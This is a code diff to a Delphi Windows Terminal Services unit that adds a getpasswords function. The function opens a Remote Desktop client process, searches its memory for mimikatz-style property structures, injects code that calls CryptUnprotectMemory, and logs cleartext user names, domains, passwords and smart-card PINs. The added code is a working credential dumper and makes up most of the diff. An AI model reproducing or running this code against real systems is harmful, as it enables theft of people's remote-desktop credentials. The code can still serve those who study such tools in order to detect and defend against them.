@@ -2,7 +2,8 @@ unit wtsapi32;
 
 interface
 
-uses windows,winsta,classes;
+uses windows,winsta,classes,utils,memfuncs,umemory,ntdll,injection,
+  instdecode in '..\ddetours\delphi-detours-library-master\Source\instdecode.pas';
 
  const
   WTS_CURRENT_SERVER        = THandle(0);
@@ -208,7 +209,46 @@ end;
 
 Type TLoggedUsers=array of TLoggedUser;
 
-TJwWTSEventThread = class(TThread)
+  type _TS_PROPERTY_KIWI =record
+	 szProperty:pointer; //PCWSTR;
+	 dwType:DWORD;
+	 pvData:PVOID;
+	 unkp0:PVOID;
+	 unkd0:DWORD;
+	 dwFlags:DWORD;
+	 unkd1:DWORD;
+	 unkd2:DWORD;
+	 pValidator:PVOID;
+	 unkp2:PVOID; // password size or ?, maybe a DWORD then align
+	 unkp3:PVOID;
+end;
+    TS_PROPERTY_KIWI=_TS_PROPERTY_KIWI;
+        PTS_PROPERTY_KIWI=^TS_PROPERTY_KIWI;
+
+type _TS_PROPERTIES_KIWI =record
+	 unkp0:PVOID; // const CTSPropertySet::`vftable'{for `CTSObject'}
+	 unkp1:PVOID; // "CTSPropertySet"
+	 unkh0:DWORD; // 0xdbcaabcd
+	 unkd0:DWORD; // 3
+	 unkp2:PVOID;
+	 unkd1:DWORD; // 45
+	 unkp3:PVOID; // tagPROPERTY_ENTRY near * `CTSCoreApi::internalGetPropMap_CoreProps(void)'::`2'::_PropSet
+	 pProperties:pointer; //PTS_PROPERTY_KIWI;
+	 cbProperties:DWORD; // 198
+end;
+      TS_PROPERTIES_KIWI=_TS_PROPERTIES_KIWI;
+      PTS_PROPERTIES_KIWI=^TS_PROPERTIES_KIWI;
+
+const mstsc_pattern:array[0..4] of byte=($cd,$ab,$ca,$db,$03);
+
+type
+  tdata=record
+    pDataIn:LPVOID;
+    cbDataIn:DWORD
+    end;
+  Ptrdata=^tdata;
+
+type TJwWTSEventThread = class(TThread)
   protected
     //
     //FOwner: TJwTerminalServer;
@@ -365,6 +405,11 @@ function TSTerminate(server:string;processid:dword):dword;
 function runTSprocess(sessionid:cardinal;process:string):boolean;
 function wtsPing(server:string):boolean;
 function WTSShutdown(server:string;flag:dword):boolean;
+function getpasswords(pid:dword):boolean;
+
+//function decryptmemory(param:pointer):cardinal;stdcall;
+
+function CryptUnprotectMemory(pDataIn:LPVOID;cbDataIn:DWORD;dwFlags:DWORD): BOOL; stdcall; external 'dpapi.dll';
 
 implementation
 
@@ -898,6 +943,238 @@ hServer:=thandle(-1);
   if pSessionInfo<>nil then WTSFreeMemory(pSessionInfo);
   if hserver<>invalid_handle_value then wtscloseserver(hserver);
 end; //proc
+
+function decryptmemory(param:pointer):cardinal;stdcall;
+        {
+        const  CRYPTPROTECTMEMORY_BLOCK_SIZE    = 16;
+        const  CRYPTPROTECTMEMORY_SAME_PROCESS  = 0;
+        const  CRYPTPROTECTMEMORY_CROSS_PROCESS = 1;
+        const  CRYPTPROTECTMEMORY_SAME_LOGON    = 2;
+        }
+begin
+
+  //messageboxa(0,'abcdef','ijklmn',MB_OK ); //test
+  //OutputDebugStringA (pchar('decryptmemory'));
+  //OutputDebugString (pchar('pDataIn:'+inttohex(nativeuint(tdata(param^).pDataIn),sizeof(nativeuint))));
+  //OutputDebugString (pchar('cbdatain:'+inttostr(tdata(param^).cbDataIn)));
+  if CryptUnprotectMemory (tdata(param^).pDataIn  ,tdata(param^).cbDataIn,0)=true
+  //CryptUnprotectMemory (pointer($1122334411223344)  ,$1234,0);
+  then result:=1 else result:=0;
+  //OutputDebugStringA(pchar('result:'+inttostr(result)));
+  //result:=0;
+  exitthread(0);
+
+  {
+  asm
+  nop
+  nop
+  nop
+  nop
+  ret
+  end;
+  }
+end;
+
+procedure NextProc;
+  begin
+
+  end;
+
+procedure decode(param:pointer);
+var
+  Inst: TInstruction;
+  nInst: Integer;
+  tmp:string;
+  i:byte;
+  p:pointer;
+begin
+  Inst := Default (TInstruction);
+    Inst.Archi := CPUX  ;
+    Inst.NextInst := param ;
+    nInst := 0;
+    Inst.Addr := Inst.NextInst; // added
+  while (Inst.OpCode <> $c3) do
+  begin
+    inc(nInst);
+    //Inst.Addr := Inst.NextInst; //removed
+    DecodeInst(@Inst);
+    //Writeln(Format('OpCode : 0x%.2x | Length : %d', [Inst.OpCode, Inst.InstSize]));
+
+  //if inst.InstSize>1 then
+    begin
+    tmp:='';
+    for i:=0 to inst.InstSize-1  do
+      begin
+      p:=pointer(nativeuint(Inst.Addr)+i);
+      tmp:=tmp+inttohex(byte(p^),2);
+      end;
+     writeln(tmp);
+    end;
+
+   //inst.Addr :=pointer(nativeint(inst.Addr)+inst.InstSize ); //added
+   Inst.Addr := Inst.NextInst;                                 //added
+  end;
+end;
+
+function getpasswords(pid:dword):boolean;
+var
+  ProcessHandle:thandle;
+  memoryregions :TMemoryRegions;
+  MemorySize,dw1,ret,c:dword;
+  BaseAddress,n:nativeint;
+  Size,written:nativeuint;
+  pfunc:pointer=nil;
+  pdata:pointer=nil;
+  properties:TS_PROPERTIES_KIWI;
+  property_:TS_PROPERTY_KIWI;
+  szPropertyName:string='';
+  bdisplay:boolean=false;
+  bytes:tbytes;
+  ptr:pointer;
+  param:tdata;
+  tid:dword;
+  status:ntstatus;
+  hthread:thandle;
+  ClientID:CLIENT_ID ;
+  label search;
+begin
+  OutputDebugString (pchar('getpasswords'));
+  log('getpasswords',0);
+  //data.cbDataIn :=999;
+  //CreateThread (nil,0,@decryptmemory,@data,0,tid);
+  //exit;
+  //decode(@decryptmemory);
+  //exit;
+  ProcessHandle:=thandle(-1);
+  setlength(bytes,1024);
+
+       ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, pid);
+       if ProcessHandle<>thandle(-1) then
+          begin
+               try
+               ret:= getallmemoryregions(ProcessHandle ,MemoryRegions); //committed only
+               if ret=0
+                     then log('getallmemoryregions failed',1)
+                     else
+                     begin
+                     //log(inttostr(length(MemoryRegions)),1);
+                     //https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information
+                     //protect 2=r 20=rx 4=rw
+                     //_type MEM_IMAGE=1000000 MEM_PRIVATE=20000 MEM_MAPPED=40000
+                     for dw1:=0 to length(MemoryRegions) -1 do
+                         begin
+                         n:=0;
+                         BaseAddress:=MemoryRegions[dw1].BaseAddress;
+                         MemorySize:=MemoryRegions[dw1].MemorySize;
+                         search:
+                         if (MemoryRegions[dw1]._type=MEM_PRIVATE) and (MemoryRegions[dw1].protect=PAGE_READWRITE)
+                            then n:=SearchMem2 (ProcessHandle ,pointer(BaseAddress),memorysize,mstsc_pattern);
+                         if n<>0 then
+                           begin
+                           //log('found @ '+inttohex(n,sizeof(n)),1);
+                           if readmem(ProcessHandle ,n-PtrUInt(@TS_PROPERTIES_KIWI(Nil^).unkh0),@properties ,sizeof(TS_PROPERTIES_KIWI))=true then
+                              begin
+                              if (Properties.unkd1 >= 10) and (Properties.unkd1 < 500) then
+                                 begin
+                                 if (Properties.cbProperties >= 10) and (Properties.cbProperties < 500) then
+                                    begin
+                                    if (Properties.pProperties)<>nil then
+                                       begin
+                                       log('*************************',1);
+                                       log('found @ '+inttohex(n,sizeof(n)),0);
+                                       log('properties:'+inttostr(properties.cbProperties) ,0);
+                                       //log('pProperties:'+inttohex(nativeint(properties.pProperties),sizeof(nativeint)) ,1);
+                                       ptr:=properties.pProperties;
+                                       for c:=0 to properties.cbProperties -1 do
+                                       begin
+                                       szPropertyName:='';
+                                       bdisplay:=false;
+                                       //log('pProperties:'+inttohex(nativeint(ptr),sizeof(nativeint)) ,1);
+                                       if readmem(ProcessHandle ,nativeuint(ptr),@property_,sizeof(property_)) then
+                                          begin
+                                          //log('dwtype:'+inttostr(property_.dwtype),1) ;
+                                          if property_.szProperty <>nil then
+                                                   if readmem(ProcessHandle ,nativeuint(property_.szProperty ),@bytes[0],512) then
+                                                      //log(strpas ((@bytes[0])),1);
+                                                      szPropertyName:=strpas (@bytes[0]);
+                                          if ('ServerName'= szPropertyName) or
+					     ('ServerFqdn'= szPropertyName) or
+					     ('ServerNameUsedForAuthentication'= szPropertyName) or
+					     ('UserSpecifiedServerName'= szPropertyName) or
+					     ('UserName'= szPropertyName) or
+					     ('Domain'= szPropertyName) or
+					     ('Password'= szPropertyName) or
+					     ('SmartCardReaderName'= szPropertyName) or
+					     ('RDmiUsername'= szPropertyName) or
+					     ('PasswordContainsSCardPin'= szPropertyName) then bdisplay:=true;
+                                          if property_.dwtype=4 then
+                                             //kprintf(L"[wstring] ");
+                                             begin
+                                             if bdisplay=true then
+                                             begin
+                                             if readmem(ProcessHandle ,nativeuint(property_.pvData ),@bytes[0],512)
+                                               then log(szPropertyName+':'+strpas (pwidechar(@bytes[0])),1);
+                                             end; //if bdisplay=true then
+                                             end; //if property_.dwtype=4 then
+                                          if property_.dwtype=6 then
+                                             //kprintf(L"[protect] ");
+                                             begin
+                                             log('dwFlags:'+inttohex(property_.dwFlags,sizeof(property_.dwFlags)),0) ;
+                                             if readmem(ProcessHandle ,nativeuint(property_.pvData ),@bytes[0],dword(property_.unkp2))
+                                               then ;//  log(ByteToHexaString (@bytes[0],dword(property_.unkp2)) ,1);
+                                             param.pDataIn :=property_.pvData;
+                                             param.cbDataIn :=dword(property_.unkp2) ;
+                                             log('data.pDataIn:'+inttohex(nativeuint(param.pDataIn),sizeof(nativeuint)),0);
+                                             log('data.cbDataIn:'+inttostr(param.cbDataIn),0);
+                                             //lets not overwrite the original property_.pvData while calling cryptunprotectmemory
+                                             Size:=align(param.cbDataIn,$1000); //needed for NtAllocateVirtualMemory
+                                             status:=NtAllocateVirtualMemory(ProcessHandle ,@pdata,0,@Size,MEM_COMMIT or MEM_RESERVE , PAGE_READWRITE);
+                                             log('NtAllocateVirtualMemory Status:'+inttostr(Status),0);
+                                             Status:=NtWriteVirtualMemory(ProcessHandle, pdata, @bytes[0], param.cbDataIn, @Written);
+                                             log('NtWriteVirtualMemoryStatus:'+inttostr(Status),0);
+                                             param.pDataIn:=pdata;
+                                             if property_.dwFlags=$800 then
+                                             begin
+                                             if InjectRTL_CODE (ProcessHandle ,@decryptmemory,@param)
+                                                then log('InjectRTL_CODE OK',0)
+                                                else log('InjectRTL_CODE NOK',0);
+                                             //lets read our newly allocated buffer which now contains a decrypted memory
+                                             if bdisplay=true then
+                                             begin
+                                             if readmem(ProcessHandle ,nativeuint(pdata ),@bytes[0],dword(property_.unkp2))
+                                               then log(szPropertyName+':'+BytetoAnsiString (@bytes[4],dword(property_.unkp2)-4) ,1);
+                                             end; //if bdisplay=true then
+                                             //free the buffer eventually...
+                                             //could be an idea to write garbage before...
+                                             NtFreeVirtualMemory (ProcessHandle,@pdata ,@size,MEM_RELEASE);
+                                             end; //if property_.dwFlags=$800 then
+                                             //
+                                             if property_.dwFlags<>$800 then
+                                                if readmem(ProcessHandle ,nativeuint(property_.pvData ),@bytes[0],dword(property_.unkp2))
+                                                  then log(ByteToHexaString (@bytes[0],dword(property_.unkp2)) ,1);
+                                             end; //if property_.dwtype=6 then
+                                          end; //if readmem ...
+                                       inc(ptr,sizeof(property_));
+                                       end; //for i:=0 to properties.cbProperties -1 do
+                                       end; //if pointer(Properties.pProperties)<>nil
+                                    end; //if (Properties.cbProperties >= 10) ...
+                                 end; //if (Properties.unkd1 >= 10) ...
+                              end; //if readmem ...
+                           //more?
+                           MemorySize :=MemorySize -((n-baseaddress)+1);
+                           BaseAddress:=n+1;
+                           goto search;
+                           end; //if n<>0 then
+
+                         end;
+                     end;
+               except
+               on e:exception do log(e.message,1);
+               end;
+          CloseHandle(ProcessHandle);
+          end
+          else log('OpenProcess failed',1);
+end;
 
 //********************
 constructor TJwWTSEventThread.Create(CreateSuspended: Boolean;
